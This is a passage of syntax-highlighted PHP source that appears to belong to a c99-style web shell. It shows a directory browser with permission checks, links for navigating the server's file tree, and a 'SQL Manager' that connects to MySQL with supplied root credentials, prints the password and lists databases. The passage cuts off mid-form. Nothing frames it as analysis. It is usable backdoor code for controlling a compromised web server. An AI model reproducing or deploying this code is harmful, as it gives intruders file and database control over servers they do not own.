      <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td colspan=</span><span class="se">\&quot;</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2"> class=</span><span class="se">\&quot;</span><span class="s2">quicklaunch</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%d&quot;</span><span class="p">,</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">),</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
      <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%sort&quot;</span><span class="p">,</span><span class="nv">$sort</span><span class="p">,</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
      <span class="nv">$v</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;..&quot;</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$a</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
        <span class="nb">unset</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">]);</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%upd&quot;</span><span class="p">,</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$v</span><span class="p">),</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
      <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;!-- End of Quicklaunch --&amp;gt;</span>
<span class="x">        &amp;lt;!-- Directory Info --&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;td colspan=&quot;2&quot;&amp;gt;</span>
<span class="x">        &amp;lt;div class=&quot;fleft&quot;&amp;gt;</span>
<span class="cp">&lt;?php</span>
  <span class="nv">$pd</span> <span class="o">=</span> <span class="nv">$e</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
  <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$pd</span> <span class="k">as</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$e</span> <span class="k">as</span> <span class="nv">$r</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$t</span><span class="o">.=</span> <span class="nv">$r</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">==</span> <span class="nv">$i</span><span class="p">)</span> <span class="p">{</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>
      <span class="nv">$j</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$t</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">&quot;</span><span class="p">;</span>
  <span class="k">echo</span> <span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="o">?</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&quot;</span> <span class="o">:</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
  <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;/div&amp;gt;</span>
<span class="x">        &amp;lt;div class=&quot;fright&quot;&amp;gt;</span>
<span class="x">        &amp;lt;form name=&quot;f_dir&quot; method=&quot;POST&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;ls&quot;&amp;gt;</span>
<span class="x">            Directory: &amp;lt;input type=&quot;text&quot; name=&quot;d&quot; size=&quot;60&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt; &amp;lt;input type=submit value=&quot;Go&quot;&amp;gt;</span>
<span class="x">        &amp;lt;/form&amp;gt;</span>
<span class="x">        &amp;lt;/div&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;!-- End of Directory Info --&amp;gt;</span>
<span class="x">    &amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;/div&amp;gt;</span>
<span class="x">&amp;lt;!-- End of Main Menu --&amp;gt;</span>
<span class="x">&amp;lt;!-- Main Info --&amp;gt;</span>
<span class="x">&amp;lt;div id=&quot;maininfo&quot;&amp;gt;</span>
<span class="cp">&lt;?php</span>
  <span class="c1">#####################################</span>
  <span class="c1">###[ INFORMATION TABLE ]###</span>
  <span class="c1">#####################################</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$act</span> <span class="o">=</span> <span class="nv">$dspact</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="c1">###[ SQL ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;sql&quot;</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$sql_surl</span> <span class="o">=</span> <span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_login</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_passwd</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_server</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_port</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_tbl</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_tbl_act</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_order</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_order</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_getfile</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_getfile</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="c1">#SQL URL Setting</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_login</span><span class="p">)</span>  <span class="p">{</span> <span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_passwd</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_server</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_port</span><span class="p">)</span>   <span class="p">{</span> <span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_db</span><span class="p">)</span>     <span class="p">{</span> <span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_db=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span> <span class="p">}</span>
  <span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">&amp;lt;!-- SQL Manager --&amp;gt;</span>
<span class="x">&amp;lt;div class=&quot;barheader&quot;&amp;gt;.: SQL Manager (Under Construction) :.&amp;lt;/div&amp;gt;</span>
<span class="x">&amp;lt;div class=&quot;barheader&quot;&amp;gt;</span><span class="cp">&lt;?php</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_server</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$sql_sock</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$sql_server</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$sql_port</span><span class="p">,</span> <span class="nv">$sql_login</span><span class="p">,</span> <span class="nv">$sql_passwd</span><span class="p">);</span>
    <span class="nv">$err</span> <span class="o">=</span> <span class="nx">mysql_smarterror</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span>
    <span class="o">@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">,</span><span class="nv">$sql_sock</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_query</span> <span class="k">and</span> <span class="nv">$submit</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$sql_query_result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="nv">$sql_sock</span><span class="p">);</span>
      <span class="nv">$sql_query_error</span> <span class="o">=</span> <span class="nx">mysql_smarterror</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span> <span class="nv">$sql_sock</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nv">$sql_server</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;No Connection!&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;ERROR: &quot;</span><span class="o">.</span><span class="nv">$err</span><span class="p">);</span> <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
        <span class="c1">#SQL Quicklaunch</span>
    <span class="nv">$sqlquicklaunch</span>   <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Index&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;&quot;</span><span class="p">);</span>
    <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Query&quot;</span><span class="p">,</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_act=query&amp;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">));</span>
    <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Server-status&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_act=serverstatus&quot;</span><span class="p">);</span>
    <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Server variables&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_act=servervars&quot;</span><span class="p">);</span>
    <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Processes&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_act=processes&quot;</span><span class="p">);</span>
    <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Logout&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&quot;</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">&quot;MySQL &quot;</span><span class="o">.</span><span class="nb">mysql_get_server_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; (proto v.&quot;</span><span class="o">.</span><span class="nb">mysql_get_proto_info</span> <span class="p">()</span><span class="o">.</span><span class="s2">&quot;) Server: &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; as &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;@&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (password - </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$sqlquicklaunch</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">foreach</span><span class="p">(</span><span class="nv">$sqlquicklaunch</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;[ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt; ] &quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="p">}</span>
  <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">&amp;lt;/div&amp;gt;</span>
<span class="x">&amp;lt;table&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;</span>
<span class="cp">&lt;?php</span>
  <span class="c1">#Login Form</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    &amp;lt;td&amp;gt;</span>
<span class="x">    &amp;lt;form name=&quot;f_sql&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;</span>
<span class="x">        &amp;lt;table class=&quot;explorer&quot;&amp;gt;</span>
<span class="x">            &amp;lt;tr&amp;gt;</span>
<span class="x">            &amp;lt;th&amp;gt;Username&amp;lt;br&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sql_login&quot; value=&quot;root&quot;&amp;gt;&amp;lt;/th&amp;gt;</span>
<span class="x">            &amp;lt;th&amp;gt;Password&amp;lt;br&amp;gt;&amp;lt;input type=&quot;password&quot; name=&quot;sql_passwd&quot; value=&quot;&quot;&amp;gt;&amp;lt;/th&amp;gt;</span>
<span class="x">            &amp;lt;th&amp;gt;Database&amp;lt;br&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sql_db&quot; value=&quot;&quot;&amp;gt;&amp;lt;/th&amp;gt;</span>
<span class="x">            &amp;lt;th&amp;gt;Host&amp;lt;br&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sql_server&quot; value=&quot;localhost&quot;&amp;gt;&amp;lt;/th&amp;gt;</span>
<span class="x">            &amp;lt;th&amp;gt;Port&amp;lt;br&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sql_port&quot; value=&quot;3306&quot; size=&quot;3&quot;&amp;gt;&amp;lt;/th&amp;gt;</span>
<span class="x">            &amp;lt;/tr&amp;gt;</span>
<span class="x">            &amp;lt;tr&amp;gt;&amp;lt;th colspan=&quot;5&quot;&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;Connect&quot;&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;/table&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="cp">&lt;?php</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="c1">#Start left panel</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    &amp;lt;td&amp;gt;</span>
<span class="x">    &amp;lt;center&amp;gt;</span>
<span class="x">    &amp;lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$sql_surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;b&amp;gt;HOME&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;</span>
<span class="x">    &amp;lt;hr size=&quot;1&quot; noshade&amp;gt;</span>
<span class="cp">&lt;?php</span>
      <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_list_dbs</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">();</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    Database</span>
<span class="x">    &amp;lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;select name=&quot;sql_db&quot; onchange=&quot;this.form.submit()&quot;&amp;gt;</span>
